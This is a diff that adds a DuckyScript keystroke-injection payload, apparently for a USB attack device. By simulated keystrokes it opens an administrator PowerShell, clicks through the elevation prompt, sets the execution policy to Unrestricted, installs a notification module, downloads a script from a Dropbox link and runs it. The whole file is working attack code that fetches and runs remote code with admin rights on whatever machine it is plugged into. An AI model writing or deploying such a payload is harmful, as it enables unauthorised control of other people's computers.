@@ -1,0 +1,36 @@
+GUI d
+DELAY 100
+REM Start powershell as admin
+GUI r
+DELAY 500
+STRING PowerShell.exe
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 1000
+LEFT
+DELAY 500
+ENTER
+DELAY 500
+STRING cd C:\Users\Public
+ENTER
+DELAY 500
+STRING Set-ExecutionPolicy Unrestricted
+ENTER
+DELAY 500
+STRING O
+ENTER
+DELAY 500
+STRING Install-Module BurntToast -Force
+ENTER
+DELAY 5000
+STRING S
+ENTER
+DELAY 500
+STRING iwr -uri https://www.dropbox.com/s/rquth3wf3olvlnj/dick.ps1?dl=1 -OutFile dick.ps1
+ENTER
+DELAY 500
+STRING .\dick.ps1
+ENTER
+DELAY 500
+STRING exit
+ENTER
